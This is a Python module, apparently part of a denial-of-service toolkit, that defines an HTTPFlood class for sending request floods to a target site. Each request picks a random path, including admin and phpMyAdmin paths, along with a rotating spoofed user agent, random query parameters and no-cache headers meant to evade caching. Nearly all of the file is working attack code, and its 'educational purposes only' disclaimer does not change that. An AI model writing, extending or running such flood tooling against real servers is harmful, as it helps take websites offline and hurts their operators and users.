#!/usr/bin/env python3
"""
🌊 HTTP Flood Attack Module
Created By: Rajsaraswati Jatav
GitHub: https://github.com/RAJSARASWATI-JATAV

⚠️ FOR EDUCATIONAL AND ETHICAL TESTING PURPOSES ONLY ⚠️
"""

import requests
import random
import time
from urllib.parse import urlparse
from colorama import Fore, Style

class HTTPFlood:
    """HTTP Flood Attack Implementation"""
    
    def __init__(self, target, port=80):
        self.target = target
        self.port = port
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)',
            'Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0'
        ]
        
        self.payloads = [
            '/',
            '/index.html',
            '/home',
            '/login',
            '/admin',
            '/search',
            '/api/v1/data',
            '/wp-admin/',
            '/phpmyadmin/'
        ]
        
        # Build target URL
        if not self.target.startswith('http'):
            self.base_url = f"http://{self.target}:{self.port}"
        else:
            self.base_url = self.target
    
    def execute_attack(self):
        """Execute HTTP flood attack"""
        try:
            # Random payload and user agent
            payload = random.choice(self.payloads)
            user_agent = random.choice(self.user_agents)
            
            headers = {
                'User-Agent': user_agent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache'
            }
            
            # Add random parameters
            params = {
                'id': random.randint(1, 10000),
                'q': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10)),
                'page': random.randint(1, 100),
                't': int(time.time())
            }
            
            # Make request
            url = f"{self.base_url}{payload}"
            response = requests.get(
                url,
                headers=headers,
                params=params,
                timeout=5,
                allow_redirects=False
            )
            
            return response.status_code < 500
            
        except Exception as e:
            return False
    
    def get_info(self):
        """Get attack module information"""
        return {
            'name': 'HTTP Flood',
            'description': 'High-volume HTTP request flooding',
            'target': self.target,
            'port': self.port,
            'method': 'GET/POST flooding with random payloads'
        }